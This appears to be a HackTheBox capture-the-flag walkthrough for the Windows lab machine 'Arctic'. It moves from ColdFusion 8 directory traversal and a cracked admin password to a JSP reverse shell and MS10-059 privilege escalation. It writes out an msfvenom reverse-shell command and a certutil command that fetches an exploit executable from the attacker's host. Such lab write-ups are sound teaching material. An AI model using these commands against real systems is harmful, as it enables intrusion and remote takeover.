@@ -1,0 +1,165 @@
+I"`<h1 id="introductionaccess">Introduction@Access:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Arctic</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.11</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/1">ch4p</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>22nd March 2017</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Exploiting <code class="language-plaintext highlighter-rouge">Coldfusion8</code> for <em>directory traversal</em> and getting the credentials to login as <strong>Admin</strong>.</li>
+  <li>Loging into the dashboard and uploading a <code class="language-plaintext highlighter-rouge">jsp</code> shell to get a reverse connection back using <em>Scheduled tasks</em> functionality.</li>
+  <li>Escalating <code class="language-plaintext highlighter-rouge">Privileges</code> by using <strong>Local windows exploit suggester</strong>, which gave <code class="language-plaintext highlighter-rouge">MS10-059.exe</code> as one of the recommendations.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/nmap-scan-1.png" alt="" /></p>
+
+<p>Basically <code class="language-plaintext highlighter-rouge">3 Ports</code> are open i.e. <code class="language-plaintext highlighter-rouge">135,8500,49154</code>. I found this about port <em>8500</em> on the internet:</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/port-8500-cold-fusion-2-tcp.png" alt="" /></p>
+
+<p>It runs <code class="language-plaintext highlighter-rouge">Adobe Coldfusion</code> on tcp port.</p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">port 8500</code>, I found this:</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/accessing-port-8500-3.png" alt="" /></p>
+
+<p>Exploring <code class="language-plaintext highlighter-rouge">/CFIDE</code> directory</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/CFIDE-directory-port-8500-access-4.png" alt="" /></p>
+
+<p>We finally got a admin page on <strong>http://10.10.10.11:8500/CFIDE/administrator/enter.cfm</strong></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/admin-page-access-5.png" alt="" /></p>
+
+<p>Searching for some vulnerabilites on <code class="language-plaintext highlighter-rouge">Coldfusion8</code>, I found a <a href="https://www.exploit-db.com/exploits/14641">directory traversal vulnerability</a></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/cold-fusion-8-exploitdb-6.png" alt="" /></p>
+
+<p>Running the above exploit as explained, I got the <code class="language-plaintext highlighter-rouge">password hash</code> for the administrator.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/got-password-for-traversal-8.png" alt="" /></p>
+
+<p>Running it on an online decrypter, I got the password as <code class="language-plaintext highlighter-rouge">happyday</code>.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/we-got-this-encrypted-value-9.png" alt="" /></p>
+
+<p>I googled a bit and found that <code class="language-plaintext highlighter-rouge">Scheduled tasks</code> can be inititated from the <strong>coldfusion8</strong> dashboard.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/scheduled-tasks-creating-a-new-task-10.png" alt="" /></p>
+
+<p>As it shows <em>Java and JVM</em>, so I thought to upload a <code class="language-plaintext highlighter-rouge">jsp shell</code>.</p>
+
+<p>Creating payload using <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+
+<p><strong>Command</strong> : <em>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw &gt; reverse.jsp</em></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/creating-msfvenom-payload-23.png" alt="" /></p>
+
+<p>Hosting it on my machine using <code class="language-plaintext highlighter-rouge">Python server</code>.</p>
+
+<p><strong>Hosting</strong>: <em>python3 -m http.server 8081</em></p>
+
+<p>Using URL as <code class="language-plaintext highlighter-rouge">http://10.10.X.X:8081/reverse.jsp</code> –&gt; <em>To download it on the windows machine.</em></p>
+
+<p>Saving the <strong>Output file as</strong> : <code class="language-plaintext highlighter-rouge">C:\ColdFusion8\wwwroot\CFIDE\shell.jsp</code></p>
+
+<p>Make sure to fill the <strong>User Name</strong> and <strong>Password</strong> field while scheduling the task.</p>
+
+<p><em>User Name:</em> <code class="language-plaintext highlighter-rouge">admin</code> <em>Password:</em> <code class="language-plaintext highlighter-rouge">happyday</code></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/shell-page-new-24.png" alt="" /></p>
+
+<p>Now running the <code class="language-plaintext highlighter-rouge">Scheduled task</code>.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/running-scheduled-task-25.png" alt="" /></p>
+
+<p>Accessing the shell on <code class="language-plaintext highlighter-rouge">http://10.10.10.11:8500/CFIDE/shell.jsp</code> and listeing on the specified port, we got <code class="language-plaintext highlighter-rouge">User shell</code>.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/got-shell-26.png" alt="" /></p>
+
+<p>Let’s gather <code class="language-plaintext highlighter-rouge">systeminfo</code> for Privilege Escalation.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/copy-system-info-27.png" alt="" /></p>
+
+<p>Feeding the above information to <code class="language-plaintext highlighter-rouge">windows exploit suggester</code> which I had downloaded on my machine.</p>
+
+<p>Download link : <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">windows-exploit-suggester</a></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/windows-exploit-suggester-28.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">MS10-059.exe</code> to escalate privileges.</p>
+
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe">Download Link</a></p>
+
+<p>Sending the executable to windows machine using <code class="language-plaintext highlighter-rouge">certutil</code> command.</p>
+
+<p><strong>Command</strong>: <code class="language-plaintext highlighter-rouge">certutil -urlcache -split -f http://10.10.X.X:8081/MS10-059.exe priv.exe</code></p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/ms-10-059-exe-30.png" alt="" /></p>
+
+<p>Running the <code class="language-plaintext highlighter-rouge">exploit</code>, and we got <code class="language-plaintext highlighter-rouge">Root</code>.</p>
+
+<hr />
+<p><img src="/assets/img/arctic-hackthebox/got-root-31.png" alt="" /></p>
+:ET
